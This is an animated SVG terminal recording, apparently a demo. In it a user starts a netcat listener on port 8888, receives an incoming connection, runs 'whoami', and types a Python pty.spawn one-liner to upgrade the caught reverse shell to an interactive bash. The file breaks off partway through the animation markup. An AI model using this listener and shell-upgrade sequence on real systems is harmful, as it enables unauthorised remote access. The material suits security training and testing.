<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1310" height="602.75"><rect width="1310" height="602.75" rx="5" ry="5" class="a"/><svg y="0%" x="0%"><circle cx="20" cy="20" r="6" fill="#ff5f58"/><circle cx="40" cy="20" r="6" fill="#ffbd2e"/><circle cx="60" cy="20" r="6" fill="#18c132"/></svg><svg height="542.75" viewBox="0 0 127 54.275" width="1270" x="15" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="50"><style>@keyframes n{0%{transform:translateX(0)}.62%{transform:translateX(-127px)}.66%{transform:translateX(-254px)}3.01%{transform:translateX(-381px)}3.02%{transform:translateX(-508px)}3.03%{transform:translateX(-635px)}3.55%{transform:translateX(-889px)}3.57%{transform:translateX(-1016px)}3.91%{transform:translateX(-1270px)}4.95%{transform:translateX(-1524px)}4.98%{transform:translateX(-1651px)}7.69%{transform:translateX(-1778px)}7.7%{transform:translateX(-1905px)}8.7%{transform:translateX(-2159px)}11.11%{transform:translateX(-2286px)}11.28%{transform:translateX(-2413px)}13.12%{transform:translateX(-2667px)}15.6%{transform:translateX(-2794px)}16.21%{transform:translateX(-2921px)}16.87%{transform:translateX(-3048px)}17.49%{transform:translateX(-3175px)}19.21%{transform:translateX(-3302px)}19.22%{transform:translateX(-3429px)}19.23%{transform:translateX(-3556px)}26.05%{transform:translateX(-3683px)}37.29%{transform:translateX(-3810px)}37.84%{transform:translateX(-3937px)}38.08%{transform:translateX(-4064px)}38.77%{transform:translateX(-4191px)}39.14%{transform:translateX(-4318px)}39.52%{transform:translateX(-4445px)}41.32%{transform:translateX(-4572px)}48.84%{transform:translateX(-4699px)}60.04%{transform:translateX(-4826px)}61.4%{transform:translateX(-4953px)}62.07%{transform:translateX(-5080px)}62.99%{transform:translateX(-5207px)}63.37%{transform:translateX(-5334px)}63.83%{transform:translateX(-5461px)}65.22%{transform:translateX(-5588px)}65.85%{transform:translateX(-5715px)}69.79%{transform:translateX(-5842px)}70.23%{transform:translateX(-5969px)}70.52%{transform:translateX(-6096px)}73.25%{transform:translateX(-6223px)}73.27%{transform:translateX(-6350px)}73.71%{transform:translateX(-6477px)}74.23%{transform:translateX(-6604px)}74.64%{transform:translateX(-6731px)}74.66%{transform:translateX(-6858px)}74.99%{transform:translateX(-6985px)}75.3%{transform:translateX(-7112px)}76.71%{transform:translateX(-7239px)}77.4%{transform:translateX(-7366px)}78.18%{transform:translateX(-7493px)}78.8%{transform:translateX(-7620px)}80.53%{transform:translateX(-7747px)}80.57%{transform:translateX(-7874px)}80.62%{transform:translateX(-8001px)}81.36%{transform:translateX(-8128px)}81.61%{transform:translateX(-8255px)}82.18%{transform:translateX(-8382px)}82.6%{transform:translateX(-8509px)}82.77%{transform:translateX(-8636px)}83.34%{transform:translateX(-8763px)}83.57%{transform:translateX(-8890px)}83.9%{transform:translateX(-9017px)}84.41%{transform:translateX(-9144px)}84.63%{transform:translateX(-9271px)}84.95%{transform:translateX(-9398px)}85.48%{transform:translateX(-9525px)}86.01%{transform:translateX(-9652px)}86.05%{transform:translateX(-9779px)}86.76%{transform:translateX(-9906px)}87%{transform:translateX(-10033px)}87.28%{transform:translateX(-10160px)}87.44%{transform:translateX(-10287px)}87.71%{transform:translateX(-10414px)}87.99%{transform:translateX(-10541px)}89.78%{transform:translateX(-10668px)}90.62%{transform:translateX(-10795px)}92.04%{transform:translateX(-10922px)}99.19%{transform:translateX(-11049px)}99.23%{transform:translateX(-11176px)}to{transform:translateX(-11303px)}}.a{fill:#282d35}.f{fill:#b9c0cb;white-space:pre}.g,.h,.i,.k,.p,.q{fill:#71bef2;white-space:pre}.h,.i,.k,.p,.q{fill:#66c2cd}.i,.k,.p,.q{fill:#0f0}.k,.p,.q{fill:#0ff}.p,.q{fill:#e88388}.q{fill:#555}</style><g font-family="Monaco,Consolas,Menlo,'Bitstream Vera Sans Mono','Powerline Symbols',monospace" font-size="1.67"><defs><symbol id="1"><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text></symbol><symbol id="2"><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lvnp</text></symbol><symbol id="3"><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lvnp</text><text x="11.022" y="1.67" class="h">8888</text></symbol><symbol id="4"><text y="1.67" class="f">Listening</text><text x="10.02" y="1.67" class="f">on</text><text x="13.026" y="1.67" class="f">0.0.0.0</text><text x="21.042" y="1.67" class="f">8888</text></symbol><symbol id="5"><text y="1.67" class="f">Connection</text><text x="11.022" y="1.67" class="f">received</text><text x="20.04" y="1.67" class="f">on</text><text x="23.046" y="1.67" class="f">[Biaogo]</text><text x="32.064" y="1.67" class="f">profile</text></symbol><symbol id="6"><text y="1.67" class="f">whoami</text></symbol><symbol id="7"><text y="1.67" class="f">biaogo</text></symbol><symbol id="8"><text y="1.67" class="f">python3</text></symbol><symbol id="9"><text y="1.67" class="f">python3</text><text x="8.016" y="1.67" class="f">-c</text></symbol><symbol id="10"><text y="1.67" class="f">python3</text><text x="8.016" y="1.67" class="f">-c</text><text x="11.022" y="1.67" class="f">&apos;import</text></symbol><symbol id="11"><text y="1.67" class="f">python3</text><text x="8.016" y="1.67" class="f">-c</text><text x="11.022" y="1.67" class="f">&apos;import</text><text x="19.038" y="1.67" class="f">pty;pty.spawn(&quot;/bin/bash&quot;)</text></symbol><symbol id="12"><text y="1.67" class="f">python3</text><text x="8.016" y="1.67" class="f">-c</text><text x="11.022" y="1.67" class="f">&apos;import</text><text x="19.038" y="1.67" class="f">pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</text></symbol><symbol id="13"><text y="1.67" class="i">┌──[HQ🚀</text><text x="8.016" y="1.67" style="white-space:pre" fill="#ff00d7">0.0.0.0⚔️biaogo</text><text x="23.046" y="1.67" class="i">]</text></symbol><symbol id="14"><text y="1.67" class="i">└──╼[👾]</text><text x="8.016" y="1.67" class="k">/home/biaogo</text><text x="21.042" y="1.67" class="k">$</text></symbol><symbol id="a"><path fill="transparent" d="M0 0h127v25H0z"/></symbol><symbol id="b"><path fill="#6f7683" d="M0 0h1.102v2.171H0z"/></symbol></defs><path class="a" d="M0 0h127v54.275H0z"/><g style="animation-duration:26.616184s;animation-iteration-count:infinite;animation-name:n;animation-timing-function:steps(1,end)"><svg width="11430"><svg><use xlink:href="#a"/><use xlink:href="#b" x="-.004"/></svg><svg x="127"><use xlink:href="#a"/><use xlink:href="#b" x="-.004"/></svg><svg x="254"><use xlink:href="#a"/><use xlink:href="#b" x=".996"/><text y="1.67" class="f">$</text></svg><svg x="381"><use xlink:href="#a"/><use xlink:href="#b" x="2.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="f">n</text></svg><svg x="508"><use xlink:href="#a"/><use xlink:href="#b" x="2.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="p">n</text></svg><svg x="635"><use xlink:href="#a"/><use xlink:href="#b" x="2.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="p">n</text><text x="3.006" y="1.67" class="q">amei</text></svg><svg x="762"><use xlink:href="#a"/><use xlink:href="#b" x="3.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="p">nc</text></svg><svg x="889"><use xlink:href="#a"/><use xlink:href="#b" x="3.996"/><use xlink:href="#1"/></svg><svg x="1016"><use xlink:href="#a"/><use xlink:href="#b" x="3.996"/><use xlink:href="#1"/></svg><svg x="1143"><use xlink:href="#a"/><use xlink:href="#b" x="4.996"/><use xlink:href="#1"/></svg><svg x="1270"><use xlink:href="#a"/><use xlink:href="#b" x="4.996"/><use xlink:href="#1"/></svg><svg x="1397"><use xlink:href="#a"/><use xlink:href="#b" x="5.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="f">-</text></svg><svg x="1524"><use xlink:href="#a"/><use xlink:href="#b" x="5.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-</text></svg><svg x="1651"><use xlink:href="#a"/><use xlink:href="#b" x="5.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-</text><text x="6.012" y="1.67" class="q">4</text></svg><svg x="1778"><use xlink:href="#a"/><use xlink:href="#b" x="6.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-l</text></svg><svg x="1905"><use xlink:href="#a"/><use xlink:href="#b" x="6.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-l</text><text x="7.014" y="1.67" class="q">4</text></svg><svg x="2032"><use xlink:href="#a"/><use xlink:href="#b" x="7.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lv</text></svg><svg x="2159"><use xlink:href="#a"/><use xlink:href="#b" x="7.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lv</text><text x="8.016" y="1.67" class="q">4</text></svg><svg x="2286"><use xlink:href="#a"/><use xlink:href="#b" x="8.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lvn</text><text x="9.018" y="1.67" class="q">4</text></svg><svg x="2413"><use xlink:href="#a"/><use xlink:href="#b" x="9.996"/><use xlink:href="#2"/></svg><svg x="2540"><use xlink:href="#a"/><use xlink:href="#b" x="10.996"/><use xlink:href="#2"/></svg><svg x="2667"><use xlink:href="#a"/><use xlink:href="#b" x="10.996"/><use xlink:href="#2"/></svg><svg x="2794"><use xlink:href="#a"/><use xlink:href="#b" x="11.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lvnp</text><text x="11.022" y="1.67" class="h">8</text></svg><svg x="2921"><use xlink:href="#a"/><use xlink:href="#b" x="12.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lvnp</text><text x="11.022" y="1.67" class="h">88</text></svg><svg x="3048"><use xlink:href="#a"/><use xlink:href="#b" x="13.996"/><text y="1.67" class="f">$</text><text x="2.004" y="1.67" class="g">nc</text><text x="5.01" y="1.67" class="h">-lvnp</text><text x="11.022" y="1.67" class="h">888</text></svg><svg x="3175"><use xlink:href="#a"/><use xlink:href="#b" x="14.996"/><use xlink:href="#3"/></svg><svg x="3302"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="2.146"/><use xlink:href="#3"/></svg><svg x="3429"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="2.146"/><use xlink:href="#3"/></svg><svg x="3556"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="4.317"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/></svg><svg x="3683"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/></svg><svg x="3810"><use xlink:href="#a"/><use xlink:href="#b" x=".996" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><text y="8.183" class="f">w</text></svg><svg x="3937"><use xlink:href="#a"/><use xlink:href="#b" x="1.996" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><text y="8.183" class="f">wh</text></svg><svg x="4064"><use xlink:href="#a"/><use xlink:href="#b" x="2.996" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><text y="8.183" class="f">who</text></svg><svg x="4191"><use xlink:href="#a"/><use xlink:href="#b" x="3.996" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><text y="8.183" class="f">whoa</text></svg><svg x="4318"><use xlink:href="#a"/><use xlink:href="#b" x="4.996" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><text y="8.183" class="f">whoam</text></svg><svg x="4445"><use xlink:href="#a"/><use xlink:href="#b" x="5.996" y="6.488"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/></svg><svg x="4572"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="8.659"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/></svg><svg x="4699"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/></svg><svg x="4826"><use xlink:href="#a"/><use xlink:href="#b" x=".996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">p</text></svg><svg x="4953"><use xlink:href="#a"/><use xlink:href="#b" x="1.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">py</text></svg><svg x="5080"><use xlink:href="#a"/><use xlink:href="#b" x="2.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">pyt</text></svg><svg x="5207"><use xlink:href="#a"/><use xlink:href="#b" x="3.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">pyth</text></svg><svg x="5334"><use xlink:href="#a"/><use xlink:href="#b" x="4.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">pytho</text></svg><svg x="5461"><use xlink:href="#a"/><use xlink:href="#b" x="5.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python</text></svg><svg x="5588"><use xlink:href="#a"/><use xlink:href="#b" x="6.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#8" y="10.855"/></svg><svg x="5715"><use xlink:href="#a"/><use xlink:href="#b" x="7.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#8" y="10.855"/></svg><svg x="5842"><use xlink:href="#a"/><use xlink:href="#b" x="8.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-</text></svg><svg x="5969"><use xlink:href="#a"/><use xlink:href="#b" x="9.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#9" y="10.855"/></svg><svg x="6096"><use xlink:href="#a"/><use xlink:href="#b" x="10.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#9" y="10.855"/></svg><svg x="6223"><use xlink:href="#a"/><use xlink:href="#b" x="11.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;</text></svg><svg x="6350"><use xlink:href="#a"/><use xlink:href="#b" x="12.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;i</text></svg><svg x="6477"><use xlink:href="#a"/><use xlink:href="#b" x="13.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;im</text></svg><svg x="6604"><use xlink:href="#a"/><use xlink:href="#b" x="14.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;imp</text></svg><svg x="6731"><use xlink:href="#a"/><use xlink:href="#b" x="15.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;impo</text></svg><svg x="6858"><use xlink:href="#a"/><use xlink:href="#b" x="16.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;impor</text></svg><svg x="6985"><use xlink:href="#a"/><use xlink:href="#b" x="17.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#10" y="10.855"/></svg><svg x="7112"><use xlink:href="#a"/><use xlink:href="#b" x="18.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#10" y="10.855"/></svg><svg x="7239"><use xlink:href="#a"/><use xlink:href="#b" x="19.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">p</text></svg><svg x="7366"><use xlink:href="#a"/><use xlink:href="#b" x="20.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pt</text></svg><svg x="7493"><use xlink:href="#a"/><use xlink:href="#b" x="21.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty</text></svg><svg x="7620"><use xlink:href="#a"/><use xlink:href="#b" x="22.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;</text></svg><svg x="7747"><use xlink:href="#a"/><use xlink:href="#b" x="23.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;p</text></svg><svg x="7874"><use xlink:href="#a"/><use xlink:href="#b" x="24.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pt</text></svg><svg x="8001"><use xlink:href="#a"/><use xlink:href="#b" x="25.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty</text></svg><svg x="8128"><use xlink:href="#a"/><use xlink:href="#b" x="26.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.</text></svg><svg x="8255"><use xlink:href="#a"/><use xlink:href="#b" x="27.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.s</text></svg><svg x="8382"><use xlink:href="#a"/><use xlink:href="#b" x="28.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.sp</text></svg><svg x="8509"><use xlink:href="#a"/><use xlink:href="#b" x="29.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spa</text></svg><svg x="8636"><use xlink:href="#a"/><use xlink:href="#b" x="30.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spaw</text></svg><svg x="8763"><use xlink:href="#a"/><use xlink:href="#b" x="31.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn</text></svg><svg x="8890"><use xlink:href="#a"/><use xlink:href="#b" x="32.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(</text></svg><svg x="9017"><use xlink:href="#a"/><use xlink:href="#b" x="33.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;</text></svg><svg x="9144"><use xlink:href="#a"/><use xlink:href="#b" x="34.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/</text></svg><svg x="9271"><use xlink:href="#a"/><use xlink:href="#b" x="35.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/b</text></svg><svg x="9398"><use xlink:href="#a"/><use xlink:href="#b" x="36.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bi</text></svg><svg x="9525"><use xlink:href="#a"/><use xlink:href="#b" x="37.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin</text></svg><svg x="9652"><use xlink:href="#a"/><use xlink:href="#b" x="38.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/</text></svg><svg x="9779"><use xlink:href="#a"/><use xlink:href="#b" x="39.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/b</text></svg><svg x="9906"><use xlink:href="#a"/><use xlink:href="#b" x="40.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/ba</text></svg><svg x="10033"><use xlink:href="#a"/><use xlink:href="#b" x="41.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/bas</text></svg><svg x="10160"><use xlink:href="#a"/><use xlink:href="#b" x="42.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" 